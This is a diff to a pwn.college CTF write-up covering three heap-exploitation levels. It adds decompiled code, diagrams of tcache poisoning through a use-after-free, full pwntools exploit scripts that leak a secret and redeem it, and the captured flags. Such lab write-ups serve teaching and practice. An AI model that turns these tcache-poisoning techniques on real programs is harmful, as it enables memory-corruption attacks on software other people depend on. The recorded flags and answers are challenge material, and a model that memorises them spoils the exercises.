@@ -1669,7 +1669,219 @@ If you can leak out this secret, you can redeem it for the flag.
 [*] Function (malloc/free/puts/scanf/send_flag/quit): 
 ```
 
-In order to 
+Lets look at the decompiled code in order to figure out the functionality of the challenge.
+
+### Binary Analysis
+
+```c title="/challenge/seeking-secrets-easy :: main()" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  unsigned int v3; // eax
+  unsigned int v4; // eax
+  int i; // [rsp+2Ch] [rbp-124h]
+  unsigned int v7; // [rsp+30h] [rbp-120h]
+  unsigned int v8; // [rsp+30h] [rbp-120h]
+  unsigned int v9; // [rsp+30h] [rbp-120h]
+  unsigned int v10; // [rsp+30h] [rbp-120h]
+  unsigned int size; // [rsp+34h] [rbp-11Ch]
+  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
+  char choice[136]; // [rsp+C0h] [rbp-90h] BYREF
+  unsigned __int64 v14; // [rsp+148h] [rbp-8h]
+
+  v14 = __readfsqword(0x28u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 1uLL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  memset(ptr, 0, sizeof(ptr));
+  for ( i = 0; i <= 7; ++i )
+    byte_423266[i] = rand() % 26 + 97;
+  puts(
+    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
+  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
+  printf("This challenge can manage up to %d unique allocations.\n\n", 16LL);
+  printf("In this challenge, there is a secret stored at %p.\n", byte_423266);
+  puts("If you can leak out this secret, you can redeem it for the flag.\n");
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          while ( 1 )
+          {
+            print_tcache(main_thread_tcache);
+            puts(byte_4035BA);
+            printf("[*] Function (malloc/free/puts/scanf/send_flag/quit): ");
+            __isoc99_scanf("%127s", choice);
+            puts(byte_4035BA);
+            if ( strcmp(choice, "malloc") )
+              break;
+            printf("Index: ");
+            __isoc99_scanf("%127s", choice);
+            puts(byte_4035BA);
+            v7 = atoi(choice);
+            if ( v7 > 15 )
+              __assert_fail("allocation_index < 16", "<stdin>", 279u, "main");
+            printf("Size: ");
+            __isoc99_scanf("%127s", choice);
+            puts(byte_4035BA);
+            size = atoi(choice);
+            printf("[*] allocations[%d] = malloc(%d)\n", v7, size);
+            ptr[v7] = malloc(size);
+            printf("[*] allocations[%d] = %p\n", v7, ptr[v7]);
+          }
+          if ( strcmp(choice, "free") )
+            break;
+          printf("Index: ");
+          __isoc99_scanf("%127s", choice);
+          puts(byte_4035BA);
+          v8 = atoi(choice);
+          if ( v8 > 15 )
+            __assert_fail("allocation_index < 16", "<stdin>", 297u, "main");
+          printf("[*] free(allocations[%d])\n", v8);
+          free(ptr[v8]);
+        }
+        if ( strcmp(choice, "puts") )
+          break;
+        printf("Index: ");
+        __isoc99_scanf("%127s", choice);
+        puts(byte_4035BA);
+        v9 = atoi(choice);
+        if ( v9 > 0xF )
+          __assert_fail("allocation_index < 16", "<stdin>", 0x136u, "main");
+        printf("[*] puts(allocations[%d])\n", v9);
+        printf("Data: ");
+        puts((const char *)ptr[v9]);
+      }
+      if ( strcmp(choice, "scanf") )
+        break;
+      printf("Index: ");
+      __isoc99_scanf("%127s", choice);
+      puts(byte_4035BA);
+      v10 = atoi(choice);
+      if ( v10 > 15 )
+        __assert_fail("allocation_index < 16", "<stdin>", 323u, "main");
+      v3 = malloc_usable_size(ptr[v10]);
+      sprintf(choice, "%%%us", v3);
+      v4 = malloc_usable_size(ptr[v10]);
+      printf("[*] scanf(\"%%%us\", allocations[%d])\n", v4, v10);
+      __isoc99_scanf(choice, ptr[v10]);
+      puts(byte_4035BA);
+    }
+    if ( strcmp(choice, "send_flag") )
+      break;
+    printf("Secret: ");
+    __isoc99_scanf("%127s", choice);
+    puts(byte_4035BA);
+    if ( !memcmp(choice, byte_423266, 8uLL) )
+    {
+      puts("Authorized!");
+      win();
+    }
+    else
+    {
+      puts("Not authorized!");
+    }
+  }
+  if ( strcmp(choice, "quit") )
+    puts("Unrecognized choice!");
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+So the secret is kept at a location in memory, which we have to read from and pass to the `send_flag`.
+
+### Polluting `tcache_entry`
+
+Let's say we allocate two chunks `A`, `B` of memory and then free them. It would look something as follows:
+
+```
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┊  tcache_perthread_struct Void                                        ┊
+┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
+┊    counts: ┃ count_16: 2    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
+┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
+┊   entries: ┃ entry_16: &A   ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
+┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊ 
+└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
+                         │
+         ╭───────────────╯         
+         │
+         v
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆  tcache_entry A  ┆
+├──────────────────┤
+│    next: &B      │ ────╮
+├──────────────────┤     │
+│    key: Void     │     │
+└──────────────────┘     │
+                         │
+         ╭───────────────╯         
+         │
+         v
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆  tcache_entry B  ┆
+├──────────────────┤
+│    next: NULL    │ 
+├──────────────────┤
+│    key: Void     │ 
+└──────────────────┘
+```
+
+Then we use the `scanf` command and read the the index of the first allocation `A` using the hanging pointer. The first 8 bytes at that location would hold the `next` pointer which would point to `B`. 
+
+We can overwrite this with the address of the secret.
+This would cause the chunk `B` to be removed from the singly-linked list, and the memory at the secret address would take it's place.
+
+```
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┊  tcache_perthread_struct Void                                        ┊
+┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
+┊    counts: ┃ count_16: 2    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
+┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
+┊   entries: ┃ entry_16: &A   ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
+┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊ 
+└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
+                         │
+         ╭───────────────╯         
+         │
+         v
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆  tcache_entry A  ┆
+├──────────────────┤
+│  next: &SECRET   │ ────╮
+├──────────────────┤     │
+│    key: Void     │     │
+└──────────────────┘     │
+                         │
+                         │
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐     │
+┆  tcache_entry B  ┆     │
+├──────────────────┤     │
+│    next: NULL    │     │
+├──────────────────┤     │
+│    key: Void     │     │
+└──────────────────┘     │
+                         │
+         ╭───────────────╯         
+         │
+         v
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆      SECRET      ┆
+├──────────────────┤
+│   next: secret   │ 
+├──────────────────┤
+│    key: ....     │ 
+└──────────────────┘
+```
+
+Now, if we allocate two chunks again of the same size, the chunk `A` and `SECRET` would be allocated because to `tcache_perthread_struct`, those are the two free chunks. And the first 8 bytes of the `SECRET` chunk would hold the secret value. We just have to call puts on this chunk and get the value.
 
 ### Exploit
 
@@ -1677,6 +1889,12 @@ In order to
 from pwn import *
 
 p = process("/challenge/seeking-secrets-easy", level='error')
+
+# 1. Capture the target address
+p.recvuntil(b"secret stored at ")
+addr_hex = p.recvuntil(b".").strip(b".").decode()
+secret_addr = int(addr_hex, 16)
+print(f"[*] Target Secret Address: {hex(secret_addr)}")
 
 p.sendline(b"malloc")
 p.sendline(b"0")
@@ -1698,7 +1916,7 @@ print(p.recvuntil(b"quit):").decode())
 
 p.sendline(b"scanf")
 p.sendline(b"0")
-p.sendline(p64(0x423266))
+p.sendline(p64(secret_addr))
 print(p.recvuntil(b"quit):").decode())
 
 p.sendline(b"malloc")
@@ -1831,11 +2049,127 @@ pwn.college{0jM840YHF5jL79Sl0oYvY6T92Nt.0VM4MDL4ITM0EzW}
 
 ## Seeking Secrets (Hard)
 
+```
+hacker@dynamic-allocator-misuse~seeking-secrets-hard:~$ /challenge/seeking-secrets-hard 
+###
+### Welcome to /challenge/seeking-secrets-hard!
+###
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+```
+
 ### Binary Analysis
 
 ```c title="/challenge/seeking-secrets-hard :: main()" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  unsigned int v3; // eax
+  int i; // [rsp+2Ch] [rbp-124h]
+  unsigned int v6; // [rsp+30h] [rbp-120h]
+  unsigned int v7; // [rsp+30h] [rbp-120h]
+  unsigned int v8; // [rsp+30h] [rbp-120h]
+  unsigned int v9; // [rsp+30h] [rbp-120h]
+  unsigned int size; // [rsp+34h] [rbp-11Ch]
+  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
+  char choice[136]; // [rsp+C0h] [rbp-90h] BYREF
+  unsigned __int64 v13; // [rsp+148h] [rbp-8h]
 
+  v13 = __readfsqword(0x28u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 1uLL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  memset(ptr, 0, sizeof(ptr));
+  for ( i = 0; i <= 7; ++i )
+    byte_422961[i] = rand() % 26 + 97;
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          while ( 1 )
+          {
+            puts(byte_40214C);
+            printf("[*] Function (malloc/free/puts/scanf/send_flag/quit): ");
+            __isoc99_scanf("%127s", choice);
+            puts(byte_40214C);
+            if ( strcmp(choice, "malloc") )
+              break;
+            printf("Index: ");
+            __isoc99_scanf("%127s", choice);
+            puts(byte_40214C);
+            v6 = atoi(choice);
+            if ( v6 > 15 )
+              __assert_fail("allocation_index < 16", "<stdin>", 114u, "main");
+            printf("Size: ");
+            __isoc99_scanf("%127s", choice);
+            puts(byte_40214C);
+            size = atoi(choice);
+            ptr[v6] = malloc(size);
+          }
+          if ( strcmp(choice, "free") )
+            break;
+          printf("Index: ");
+          __isoc99_scanf("%127s", choice);
+          puts(byte_40214C);
+          v7 = atoi(choice);
+          if ( v7 > 15 )
+            __assert_fail("allocation_index < 16", "<stdin>", 130u, "main");
+          free(ptr[v7]);
+        }
+        if ( strcmp(choice, "puts") )
+          break;
+        printf("Index: ");
+        __isoc99_scanf("%127s", choice);
+        puts(byte_40214C);
+        v8 = atoi(choice);
+        if ( v8 > 15 )
+          __assert_fail("allocation_index < 16", "<stdin>", 142u, "main");
+        printf("Data: ");
+        puts((const char *)ptr[v8]);
+      }
+      if ( strcmp(choice, "scanf") )
+        break;
+      printf("Index: ");
+      __isoc99_scanf("%127s", choice);
+      puts(byte_40214C);
+      v9 = atoi(choice);
+      if ( v9 > 15 )
+        __assert_fail("allocation_index < 16", "<stdin>", 154u, "main");
+      v3 = malloc_usable_size(ptr[v9]);
+      sprintf(choice, "%%%us", v3);
+      __isoc99_scanf(choice, ptr[v9]);
+      puts(byte_40214C);
+    }
+    if ( strcmp(choice, "send_flag") )
+      break;
+    printf("Secret: ");
+    __isoc99_scanf("%127s", choice);
+    puts(byte_40214C);
+    if ( !memcmp(choice, byte_422961, 8uLL) )
+    {
+      puts("Authorized!");
+      win();
+    }
+    else
+    {
+      puts("Not authorized!");
+    }
+  }
+  if ( strcmp(choice, "quit") )
+    puts("Unrecognized choice!");
+  puts("### Goodbye!");
+  return 0;
+}
 ```
+
+The solution for this level remains the same as the easy one.
 
 ### Exploit 
 
@@ -1844,38 +2178,40 @@ from pwn import *
 
 p = process("/challenge/seeking-secrets-hard", level='error')
 
+secret_addr = 0x422961
+
 p.sendline(b"malloc")
 p.sendline(b"0")
 p.sendline(b"128")
-print(p.recvuntil(b"Function").decode())
+print(p.recvuntil(b"quit):").decode())
 
 p.sendline(b"malloc")
 p.sendline(b"1")
 p.sendline(b"128")
-print(p.recvuntil(b"Function").decode())
+print(p.recvuntil(b"quit):").decode())
 
 p.sendline(b"free")
 p.sendline(b"1")
-print(p.recvuntil(b"Function").decode())
+print(p.recvuntil(b"quit):").decode())
 
 p.sendline(b"free")
 p.sendline(b"0")
-print(p.recvuntil(b"Function").decode())
+print(p.recvuntil(b"quit):").decode())
 
 p.sendline(b"scanf")
 p.sendline(b"0")
-p.sendline(p64(0x422961))
-print(p.recvuntil(b"Function").decode())
+p.sendline(p64(secret_addr))
+print(p.recvuntil(b"quit):").decode())
 
 p.sendline(b"malloc")
 p.sendline(b"2")
 p.sendline(b"128")
-print(p.recvuntil(b"Function").decode())
+print(p.recvuntil(b"quit):").decode())
 
 p.sendline(b"malloc")
 p.sendline(b"3")
 p.sendline(b"128")
-print(p.recvuntil(b"Function").decode())
+print(p.recvuntil(b"quit):").decode())
 
 p.sendline(b"puts")
 p.sendline(b"3")
@@ -1889,41 +2225,41 @@ print(p.recvuntil(b"}").decode())
 ```
 
 ```
-hacker@dynamic-allocator-misuse~seeking-secrets-hard:~$ python ~/script.py
+hacker@dynamic-allocator-misuse~seeking-secrets-hard:/$ python ~/script.py
 ###
 ### Welcome to /challenge/seeking-secrets-hard!
 ###
 
 
-[*] Function
- (malloc/free/puts/scanf/send_flag/quit): 
+[*] Function (malloc/free/puts/scanf/send_flag/quit):
+ 
 Index: 
 Size: 
 
-[*] Function
- (malloc/free/puts/scanf/send_flag/quit): 
+[*] Function (malloc/free/puts/scanf/send_flag/quit):
+ 
 Index: 
 Size: 
 
-[*] Function
- (malloc/free/puts/scanf/send_flag/quit): 
+[*] Function (malloc/free/puts/scanf/send_flag/quit):
+ 
 Index: 
 
-[*] Function
- (malloc/free/puts/scanf/send_flag/quit): 
+[*] Function (malloc/free/puts/scanf/send_flag/quit):
+ 
 Index: 
 
-[*] Function
- (malloc/free/puts/scanf/send_flag/quit): 
+[*] Function (malloc/free/puts/scanf/send_flag/quit):
+ 
 Index: 
 
 
-[*] Function
- (malloc/free/puts/scanf/send_flag/quit): 
+[*] Function (malloc/free/puts/scanf/send_flag/quit):
+ 
 Index: 
 Size: 
 
-[*] Function
+[*] Function (malloc/free/puts/scanf/send_flag/quit):
 [*] Leaked Secret: ipubljho
 
 [*] Function (malloc/free/puts/scanf/send_flag/quit): 
@@ -1931,4 +2267,223 @@ Secret:
 Authorized!
 You win! Here is your flag:
 pwn.college{smCm7JHRquJbXskS-KlEMuZeUe5.0lM4MDL4ITM0EzW}
+```
+
+&nbsp;
+
+## Seeking Substantial Secrets (Easy)
+
+### Binary Analysis
+
+```c title="/challenge/seeking-substantial-secrets-easy :: main()" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  unsigned int v3; // eax
+  unsigned int v4; // eax
+  int i; // [rsp+2Ch] [rbp-124h]
+  unsigned int v7; // [rsp+30h] [rbp-120h]
+  unsigned int v8; // [rsp+30h] [rbp-120h]
+  unsigned int v9; // [rsp+30h] [rbp-120h]
+  unsigned int v10; // [rsp+30h] [rbp-120h]
+  unsigned int size; // [rsp+34h] [rbp-11Ch]
+  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
+  char s1[136]; // [rsp+C0h] [rbp-90h] BYREF
+  unsigned __int64 v14; // [rsp+148h] [rbp-8h]
+
+  v14 = __readfsqword(0x28u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 1uLL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  memset(ptr, 0, sizeof(ptr));
+  for ( i = 0; i <= 15; ++i )
+    byte_429964[i] = rand() % 26 + 97;
+  puts(
+    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
+  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
+  printf("This challenge can manage up to %d unique allocations.\n\n", 16LL);
+  printf("In this challenge, there is a secret stored at %p.\n", byte_429964);
+  puts("If you can leak out this secret, you can redeem it for the flag.\n");
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          while ( 1 )
+          {
+            print_tcache(main_thread_tcache);
+            puts(byte_4035BA);
+            printf("[*] Function (malloc/free/puts/scanf/send_flag/quit): ");
+            __isoc99_scanf("%127s", s1);
+            puts(byte_4035BA);
+            if ( strcmp(s1, "malloc") )
+              break;
+            printf("Index: ");
+            __isoc99_scanf("%127s", s1);
+            puts(byte_4035BA);
+            v7 = atoi(s1);
+            if ( v7 > 0xF )
+              __assert_fail("allocation_index < 16", "<stdin>", 0x117u, "main");
+            printf("Size: ");
+            __isoc99_scanf("%127s", s1);
+            puts(byte_4035BA);
+            size = atoi(s1);
+            printf("[*] allocations[%d] = malloc(%d)\n", v7, size);
+            ptr[v7] = malloc(size);
+            printf("[*] allocations[%d] = %p\n", v7, ptr[v7]);
+          }
+          if ( strcmp(s1, "free") )
+            break;
+          printf("Index: ");
+          __isoc99_scanf("%127s", s1);
+          puts(byte_4035BA);
+          v8 = atoi(s1);
+          if ( v8 > 0xF )
+            __assert_fail("allocation_index < 16", "<stdin>", 0x129u, "main");
+          printf("[*] free(allocations[%d])\n", v8);
+          free(ptr[v8]);
+        }
+        if ( strcmp(s1, "puts") )
+          break;
+        printf("Index: ");
+        __isoc99_scanf("%127s", s1);
+        puts(byte_4035BA);
+        v9 = atoi(s1);
+        if ( v9 > 0xF )
+          __assert_fail("allocation_index < 16", "<stdin>", 0x136u, "main");
+        printf("[*] puts(allocations[%d])\n", v9);
+        printf("Data: ");
+        puts((const char *)ptr[v9]);
+      }
+      if ( strcmp(s1, "scanf") )
+        break;
+      printf("Index: ");
+      __isoc99_scanf("%127s", s1);
+      puts(byte_4035BA);
+      v10 = atoi(s1);
+      if ( v10 > 0xF )
+        __assert_fail("allocation_index < 16", "<stdin>", 0x143u, "main");
+      v3 = malloc_usable_size(ptr[v10]);
+      sprintf(s1, "%%%us", v3);
+      v4 = malloc_usable_size(ptr[v10]);
+      printf("[*] scanf(\"%%%us\", allocations[%d])\n", v4, v10);
+      __isoc99_scanf(s1, ptr[v10]);
+      puts(byte_4035BA);
+    }
+    if ( strcmp(s1, "send_flag") )
+      break;
+    printf("Secret: ");
+    __isoc99_scanf("%127s", s1);
+    puts(byte_4035BA);
+    if ( !memcmp(s1, byte_429964, 16uLL) )
+    {
+      puts("Authorized!");
+      win();
+    }
+    else
+    {
+      puts("Not authorized!");
+    }
+  }
+  if ( strcmp(s1, "quit") )
+    puts("Unrecognized choice!");
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+### Exploit
+
+```py
+from pwn import *
+
+p = process("/challenge/seeking-substantial-secrets-easy", level='error')
+
+# 1. Capture the target address
+p.recvuntil(b"secret stored at ")
+addr_hex = p.recvuntil(b".").strip(b".").decode()
+secret_addr = int(addr_hex, 16)
+print(f"[*] Target Secret Address: {hex(secret_addr)}")
+
+# --- LEAK PART 1 (First 8 Bytes) ---
+p.sendline(b"malloc")
+p.sendline(b"0")
+p.sendline(b"128")
+print(p.recvuntil(b"quit): ").decode())
+
+p.sendline(b"malloc")
+p.sendline(b"1")
+p.sendline(b"128")
+print(p.recvuntil(b"quit): ").decode())
+
+p.sendline(b"free")
+p.sendline(b"1")
+print(p.recvuntil(b"quit): ").decode())
+
+p.sendline(b"free")
+p.sendline(b"0")
+print(p.recvuntil(b"quit): ").decode())
+
+p.sendline(b"scanf")
+p.sendline(b"0")
+p.sendline(p64(secret_addr))
+print(p.recvuntil(b"quit): ").decode())
+
+p.sendline(b"malloc")
+p.sendline(b"0")
+p.sendline(b"128")
+print(p.recvuntil(b"quit): ").decode())
+
+p.sendline(b"malloc")
+p.sendline(b"1")
+p.sendline(b"128")
+print(p.recvuntil(b"quit): ").decode())
+
+p.sendline(b"puts")
+p.sendline(b"1")
+# Use ljust to ensure we have 8 bytes even if puts hits a null early
+p.recvuntil(b"Data: ")
+part1 = p.recvline().strip().ljust(8, b"\x00")[:8]
+print(f"Part 1: {part1}")
+print(p.recvuntil(b"quit): ").decode())
+
+# --- LEAK PART 2 (Second 8 Bytes) ---
+# We free Index 2 (real heap) to reuse the bin. We DO NOT free Index 3.
+p.sendline(b"free")
+p.sendline(b"0")
+print(p.recvuntil(b"quit): ").decode())
+
+# Poison Index 2 to point to the second half
+p.sendline(b"scanf")
+p.sendline(b"0")
+p.sendline(p64(secret_addr + 8))
+print(p.recvuntil(b"quit): ").decode())
+
+p.sendline(b"malloc")
+p.sendline(b"0")
+p.sendline(b"128")
+print(p.recvuntil(b"quit): ").decode())
+
+p.sendline(b"malloc")
+p.sendline(b"2")
+p.sendline(b"128")
+print(p.recvuntil(b"quit): ").decode())
+
+p.sendline(b"puts")
+p.sendline(b"2")
+p.recvuntil(b"Data: ")
+part2 = p.recvline().strip().ljust(8, b"\x00")[:8]
+print(f"Part 2: {part2}")
+print(p.recvuntil(b"quit): ").decode())
+
+# --- SUBMIT ---
+full_secret = part1 + part2
+p.sendline(b"send_flag")
+p.sendline(full_secret)
+print(p.recvuntil(b"}").decode())
 ```
